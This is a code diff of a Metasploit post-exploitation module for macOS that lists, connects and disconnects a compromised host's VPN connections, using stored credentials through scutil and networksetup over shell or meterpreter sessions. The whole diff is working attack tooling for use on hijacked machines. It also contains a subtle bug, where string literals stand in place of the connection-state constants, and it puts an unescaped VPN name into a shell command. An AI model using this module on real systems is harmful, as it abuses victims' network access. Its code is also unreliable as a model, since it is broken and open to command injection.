@@ -23,8 +23,8 @@ class Metasploit3 < Msf::Post
             'Peter Toth <globetother[at]gmail.com>'
           ],
         'Platform'      => [ 'osx' ],
-        'SessionTypes'  => [ 'shell' ],
-        'Actions'       => [ 
+        'SessionTypes'  => [ 'shell', 'meterpreter' ],
+        'Actions'       => [
           [ 'LIST',     { 'Description' => 'Show a list of VPN connections' } ],
           [ 'CONNECT', { 'Description' => 'Connect to a VPN using stored credentials' } ],
           [ 'DISCONNECT', { 'Description' => 'Disconnect from a VPN' } ]
@@ -34,60 +34,71 @@ class Metasploit3 < Msf::Post
 
     register_options(
       [
-        OptString.new('VPN_CONNECTION', [true, 'Name of VPN connection. `set ACTION LIST` to get a list.', 'OSX_VPN'])
+        OptString.new('VPN_CONNECTION', [true, 'Name of VPN connection. `set ACTION LIST` to get a list.', 'OSX_VPN']),
+        OptString.new('SCUTIL_PATH', [true, 'Path to the scutil executable.', '/usr/sbin/scutil']),
+        OptString.new('NETWORKSETUP_PATH', [true, 'Path to the networksetup executable.', '/usr/sbin/networksetup'])
       ], self.class)
 
   end
 
+  STR_CONNECTED = '* (Connected)'
+  STR_DISCONNECTED = '* (Disconnected)'
+
   def run
     fail_with("Invalid action") if action.nil?
 
-    if action.name =~ /list/i
+    if action.name == 'LIST'
       data = get_vpn_list()
-      print_status("VPN Connections Status: UP")
-      parse_vpn_connection_names(data, true)
-      print_status("VPN Connections Status: DOWN")
-      parse_vpn_connection_names(data, false)
-    elsif action.name == "CONNECT"
+      connected_names = parse_vpn_connection_names(data, true)
+      disconnected_names = parse_vpn_connection_names(data, false)
+      if connected_names.length > 0
+        print_status("VPN Connections Status: UP")
+        connected_names.each do |vpn_name|
+          print_good('  ' + vpn_name)
+        end
+      end
+      if disconnected_names.length > 0
+        print_status("VPN Connections Status: DOWN")
+        disconnected_names.each do |vpn_name|
+          print_good('  ' + vpn_name)
+        end
+      end
+    elsif action.name == 'CONNECT'
       connect_vpn(true)
-    elsif action.name == "DISCONNECT"
+    elsif action.name == 'DISCONNECT'
       connect_vpn(false)
     end
   end
 
   def get_vpn_list()
-    if session.type =~ /meterpreter/
-      vprint_status("scutil --nc list")
-      data = cmd_exec("scutil --nc list")
-    elsif session.type =~ /shell/
-      vprint_status("/usr/sbin/scutil --nc list")
-      data = session.shell_command_token("/usr/sbin/scutil --nc list",15)
-    end
+    vprint_status(datastore['SCUTIL_PATH'].shellescape + " --nc list")
+    data = cmd_exec(datastore['SCUTIL_PATH'].shellescape + " --nc list")
     return data
   end
 
   def parse_vpn_connection_names(data, show_up)
     lines = data.split(/\n/).map(&:strip)
+    connection_names = Array.new()
 
-    for x in 1..lines.length-1
-      line = lines[x]
-      if show_up && line.start_with?('* (Connected)')
-        print_good('  ' + line.split('"')[1])
-      elsif !show_up && line.start_with?('* (Disconnected)')
-        print_good('  ' + line.split('"')[1])
+    lines.each do |line|
+      if show_up && line.start_with?(STR_CONNECTED)
+        connection_names.push(line.split('"')[1])
+      elsif !show_up && line.start_with?(STR_DISCONNECTED)
+        connection_names.push(line.split('"')[1])
       end
     end
+    return connection_names
   end
 
   def connect_vpn(up)
     vpn_name = datastore['VPN_CONNECTION']
     if up
       header = "Connecting to VPN: #{vpn_name}"
-      connection_state = '* (Connected)'
+      connection_state = 'STR_CONNECTED'
       connection_unnecessary = "  #{vpn_name} already connected"
     else
       header = "Disconnecting from VPN: #{vpn_name}"
-      connection_state = '* (Disconnected)'
+      connection_state = 'STR_DISCONNECTED'
       connection_unnecessary = "  #{vpn_name} already disconnected"
     end
 
@@ -96,8 +107,7 @@ class Metasploit3 < Msf::Post
     lines = data.split(/\n/).map(&:strip)
 
     identifier = nil
-    for x in 1..lines.length-1
-      line = lines[x]
+    lines.each do |line|
       if line.split('"')[1] == vpn_name
         if line.start_with?(connection_state)
           print_status(connection_unnecessary)
@@ -113,22 +123,12 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    if session.type =~ /meterpreter/
-      if up
-        cmd = 'networksetup -connectpppoeservice "' + vpn_name + '"'
-      else
-        cmd = "scutil --nc stop #{identifier}"
-      end
-      vprint_status(cmd)
-      cmd_exec(cmd)
-    elsif session.type =~ /shell/
-      if up
-        cmd = 'networksetup -connectpppoeservice "' + vpn_name + '"'
-      else
-        cmd = "scutil --nc stop #{identifier}"
-      end
-      vprint_status(cmd)
-      session.shell_command_token(cmd,15)
+    if up
+      cmd = datastore['NETWORKSETUP_PATH'].shellescape + " -connectpppoeservice '#{vpn_name}'"
+    else
+      cmd = datastore['SCUTIL_PATH'].shellescape + " --nc stop #{identifier}"
     end
+    vprint_status(cmd)
+    cmd_exec(cmd)
   end
 end
